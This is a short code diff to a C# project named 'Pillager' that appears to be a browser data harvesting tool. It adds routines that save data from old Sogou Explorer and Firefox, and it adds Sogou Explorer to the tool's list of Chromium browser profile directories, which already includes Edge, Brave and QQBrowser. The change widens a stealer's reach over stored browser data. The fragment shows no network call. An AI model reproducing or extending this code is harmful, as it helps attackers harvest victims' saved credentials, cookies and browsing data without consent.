@@ -18,6 +18,12 @@ namespace Pillager
             //IE
             IE.Save(savepath);
 
+            //SogouExplorer < 12.x
+            OldSogou.Save(savepath);
+
+            //FireFox
+            FireFox.Save(savepath);
+
             //Chrome
             List<List<string>> browserOnChromium = new List<List<string>>()
             {
@@ -27,6 +33,7 @@ namespace Pillager
                 new List<string>() { "Edge", "Microsoft\\Edge\\User Data\\Default" } ,
                 new List<string>() { "Brave-Browse", "BraveSoftware\\Brave-Browser\\User Data\\Default" } ,
                 new List<string>() { "QQBrowser", "Tencent\\QQBrowser\\User Data\\Default" } ,
+                new List<string>() { "SogouExplorer", "Sogou\\SogouExplorer\\User Data\\Default" } ,
                 new List<string>() { "Vivaldi", "Vivaldi\\User Data\\Default" } ,
                 new List<string>() { "CocCoc", "CocCoc\\Browser\\User Data\\Default" } 
                 //new List<string>() { "", "" } ,
